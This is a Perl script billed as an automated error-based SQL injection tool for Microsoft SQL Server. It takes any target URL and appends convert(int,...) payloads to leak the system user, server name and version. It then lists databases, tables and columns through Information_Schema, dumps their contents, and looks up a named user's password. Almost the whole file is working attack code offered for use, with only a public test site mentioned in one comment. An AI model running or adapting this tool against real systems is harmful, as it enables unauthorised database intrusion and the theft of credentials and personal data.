use LWP::UserAgent;

# Author: mr.pr0n (@_pr0n_)
# Homepage: http://ghostinthelab.wordpress.com/ – http://s3cure.gr

##############################################################################
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.

print"-------------------------------------------------------------------\n";
print"| Automated (Mssql) -error based- SQL injection attack tool v.0.1 |\n";
print"-------------------------------------------------------------------\n\n";

print "Enter your Target (e.g.: http://target.com/showforum.asp?id=1)\n> ";
$target=<STDIN>;

# This is our testing target:
# http://testasp.vulnweb.com/showforum.asp?id=1

menu:;
print "\n[+] Main Menu:\n";
print "    1. Automated target's full exposure.\n";
print "    2. Search for user's password.\n";
print "    3. Exit.\n> ";

$option=<STDIN>;
if ($option!=1 && $option!=2 && $option!=3)
{
        print "Wrong Option!!\n";
        goto menu;
}

if ($option==1)
{
        &exposure
}

if ($option==2)
{
        &search
}

if ($option==3)
{
        &quit
}

# Automated target's full exposure!
sub exposure
{
        $int = LWP::UserAgent->new() or die;
        print "\n-------------------------------------------------------------------------------\n";

        #### The system user ####
        print "[+] Target: "."\n  [+] ".$target."\n";
        $user = '+and+1=convert(int,(system_user))';
        $check=$int->get($target.$user);
        if ($check->content =~ m/value '(.*)' to/g)
        {
                $user = $1;
                print "    [+] System User    : \e[1;31m$user\e[0m\n";
        }

        #### The server name ####
        $servername = "+and+1=convert(int,(\@\@servername))";
        $check=$int->get($target.$servername);
        if ($check->content =~ m/value '(.*)' to/g)
        {
                $servername = $1;
                print "    [+] Server Name    : \e[1;31m$servername\e[0m\n";
        }

        #### The server version ####
        $version = "+and+1=convert(int,(\@\@version))";
        $check=$int->get($target.$version);
        if ($check->content =~ m/value '(.*)/g)
        {
                $version = $1;
                print "    [+] Server Version : \e[1;31m$version\e[0m\n";

        }
        print "-------------------------------------------------------------------------------\n\n";
        #### Variables ####
        $end_db     = 30; # <-- Range of scanning Databases     <-_please change it!
        $end_table  = 20; # <-- Range of scanning Tables        <-_please change it!
        $end_column = 10; # <-- Range of scanning Columns       <-_please change it!
        $end_dump   = 10; # <-- Range of dumping  Columns       <-_please change it!

        #### Exposure of the target ####
        $countdb = 1;
        for ($count_db; $countdb < $end_db; $count_db++)
        {
                $db = "+and+1=convert(int,db_name($count_db))";
                $int = LWP::UserAgent->new() or die;
                $check=$int->get($target.$db);
                if ($check->content =~ m/value '(.*)' to/g)
                {
                        $database = $1;
                        print "\n  [+] Database: \e[1;31m$database\e[0m\n";
                        $infoschema_table = "+and+1=convert(int,(select+top+1+table_name+from+".$database.".Information_Schema.tables))";
                        $int = LWP::UserAgent->new() or die;
                        $check=$int->get($target.$infoschema_table);
                        if ($check->content =~ m/value '(.*)' to/g)
                        {
                                   $first_table = $1;
                                   print "       [+] Table: \e[1;35m$first_table\e[0m\n";
                                   $int = LWP::UserAgent->new() or die;
                                   $infoschema_column = "+and+1=convert(int,(select+top+1+column_name+from+".$database.".Information_Schema.columns+where+table_name='$first_table'))";
                                   $check=$int->get($target.$infoschema_column);
                                   if ($check->content =~ m/value '(.*)' to/g)
                                   {
                                           $first_column = $1;
                                           print "         [+] Column: \e[1;32m$first_column\e[0m\n";
                                           $first_column = "'$first_column'";
                                           $count_column = 1;
                                           for ($count_column; $count_column < $end_column; $count_column++)
                                           {
                                                   $fullsqli_column = "+and+1=convert(int,(select+top+1+column_name+from+".$database.".Information_Schema.columns+where+table_name='$first_table'+and+column_name+not+in($first_column)))";
                                                   $int = LWP::UserAgent->new() or die;
                                                   $check=$int->get($target.$fullsqli_column);
                                                   if ($check->content =~ m/value '(.*)' to/g)
                                                   {
                                                           $next_column = $1;
                                                           print "         [+] Column: \e[1;32m$next_column\e[0m\n";
                                                           $first_column = $first_column.",'".$next_column."'";
                                                           $dump = "+and+1=convert(int,(select+top+1+$next_column+from+$first_table))";
                                                           $int = LWP::UserAgent->new() or die;
                                                           $check=$int->get($target.$dump);
                                                           if ($check->content =~ m/value '(.*)' to/g)
                                                           {
                                                                   $dump_first = $1;
                                                                   print "           [+] Dump: \e[1;33m$dump_first\e[0m\n";
                                                                   $dump_first = "'$dump_first'";
                                                                   $count_dump = 1;
                                                                   for ($count_dump; $count_dump < $end_dump; $count_dump++)
                                                                   {
                                                                           $fullsqli = "+and+1=convert(int,(select+top+1+$next_column+from+$first_table+where+$next_column+not+in+($dump_next)))";
                                                                           $int = LWP::UserAgent->new() or die;
                                                                           $check=$int->get($target.$fullsqli);
                                                                           if ($check->content =~ m/value '(.*)' to/g)
                                                                           {
                                                                                   $dump_next = $1;
                                                                                   print "           [+] Dump: \e[1;33m$dump_next\e[0m\n";
                                                                                   $dump_first = $dump_first.",'".$dump_next."'";
                                                                            }
                                                                    }
                                                            }
                                                     }
                                              }
                                     }

                         }
                         $first_table = "'$first_table'";
                         $count_table = 1;
                         for ($count_table; $count_table < $end_table; $count_table++)
                         {
                                $fullsqli_table = "+and+1=convert(int,(select+top+1+table_name+from+".$database.".Information_Schema.tables+where+table_name+not+in($first_table)))";
                                $int = LWP::UserAgent->new() or die;
                                $check=$int->get($target.$fullsqli_table);
                                           if ($check->content =~ m/value '(.*)' to/g)
                                           {
                                                        $next_table = $1;
                                                        $first_table = $first_table.",'".$next_table."'";
                                                        print "\n       [+] Table: \e[1;35m$next_table\e[0m\n";
                                                        $infoschema_column = "+and+1=convert(int,(select+top+1+column_name+from+".$database.".Information_Schema.columns+where+table_name='$next_table'))";
                                                        $int = LWP::UserAgent->new() or die;
                                                        $check=$int->get($target.$infoschema_column);
                                                        if ($check->content =~ m/value '(.*)' to/g)
                                                        {
                                                                  $first_column = $1;
                                                                  print "         [+] Column: \e[1;32m$first_column\e[0m\n";

                                                                  $dump = "+and+1=convert(int,(select+top+1+$first_column+from+$next_table))";
                                                                  $int = LWP::UserAgent->new() or die;
                                                                  $check=$int->get($target.$dump);
                                                                  if ($check->content =~ m/value '(.*)' to/g)
                                                                  {
                                                                          $dump_first = $1;
                                                                          print "           [+] Dump: \e[1;33m$dump_first\e[0m\n";
                                                                          $dump_first = "'$dump_first'";
                                                                          $count_dump = 1;
                                                                          for ($count_dump; $count_dump < $end_dump; $count_dump++)
                                                                          {
                                                                                  $fullsqli_dump = "+and+1=convert(int,(select+top+1+$first_column+from+$next_table+where+$first_column+not+in+($dump_first)))";
                                                                                  $int = LWP::UserAgent->new() or die;
                                                                                  $check=$int->get($target.$fullsqli_dump);
                                                                                  if ($check->content =~ m/value '(.*)' to/g)
                                                                                  {
                                                                                          $dump_next = $1;
                                                                                          print "           [+] Dump: \e[1;33m$dump_next\e[0m\n";
                                                                                          $dump_first = $dump_first.",'".$dump_next."'";
                                                                                  }
                                                                          }
                                                                  }
                                                                  $first_column = "'$first_column'";
                                                                  $count_column = 1;
                                                                  for ($count_column; $count_column < $end_column; $count_column++)
                                                                  {
                                                                           $fullsqli_column = "+and+1=convert(int,(select+top+1+column_name+from+".$database.".Information_Schema.columns+where+table_name='$next_table'+and+column_name+not+in($first_column)))";
                                                                           $int = LWP::UserAgent->new() or die;
                                                                           $check=$int->get($target.$fullsqli_column);
                                                                           if ($check->content =~ m/value '(.*)' to/g)
                                                                           {
                                                                                    $next_column = $1;
                                                                                    print "         [+] Column: \e[1;32m$next_column\e[0m\n";
                                                                                    $first_column = $first_column.",'".$next_column."'";
                                                                                    $dump = "+and+1=convert(int,(select+top+1+$next_column+from+$next_table))";
                                                                                    $int = LWP::UserAgent->new() or die;
                                                                                    $check=$int->get($target.$dump);
                                                                                    if ($check->content =~ m/value '(.*)' to/g)
                                                                                    {
                                                                                           $dump_first = $1;
                                                                                           print "           [+] Dump: \e[1;33m$dump_first\e[0m\n";
                                                                                           $dump_first = "'$dump_first'";
                                                                                           $count_dump = 1;
                                                                                           for ($count_dump; $count_dump < $end_dump; $count_dump++)
                                                                                           {
                                                                                                   $fullsqli_dump = "+and+1=convert(int,(select+top+1+$next_column+from+$next_table+where+$next_column+not+in+($dump_first)))";
                                                                                                   $int = LWP::UserAgent->new() or die;
                                                                                                   $check=$int->get($target.$fullsqli_dump);
                                                                                                   if ($check->content =~ m/value '(.*)' to/g)
                                                                                                   {
                                                                                                           $dump_next = $1;
                                                                                                           print "           [+] Dump: \e[1;33m$dump_next\e[0m\n";
                                                                                                           $dump_first = $dump_first.",'".$dump_next."'";
                                                                                                   }
                                                                                           }
                                                                                     }
                                                                               }
                                                                    }
                                                            }
                                                }
                            }
                }
        }
        print "-------------------------------------------------------------------------------\n";
goto menu;
}

# Search for user's password!
sub search
{
        print"Enter your target's table with usernames and passwords: \n> ";
        $table =<STDIN>;

        print"Enter your target's column with usernames: \n> ";
        $user_column   =<STDIN>;

        print"Enter your target's column with passwords: \n> ";
        $pass_column   =<STDIN>;

        print"Enter the user you want to search for password: \n> ";
        chop ($search   =<STDIN>);

        print " [+] Searching for user '\e[1;31m$search\e[0m'...\n";
        $scan = "+and+1=convert(int,(select+top+1+$user_column+from+$table+where+$user_column=('$search')))";
        $int = LWP::UserAgent->new() or die;
        $check=$int->get($target.$scan);
        if ($check->content =~ m/$search/g)
        {
                $fullsqli = "+and+1=convert(int,(select+top+1+upass+from+$table+where+$user_column=('$search')))";
                $int = LWP::UserAgent->new() or die;
                        $check=$int->get($target.$fullsqli);
                        if ($check->content =~ m/value '(.*)' to/g)
                        {
                                $pass = $1;
                                print " [+] Password for user '\e[1;31m$search\e[0m' is '\e[1;31m$pass\e[0m'\n";
                        }
        }
        else
        {
        print "  [+] User: '$search' NOT found! \n";
        }
goto menu;
}

#Exit!
sub quit
{
print "Go for beer!\n";
exit(1);
}
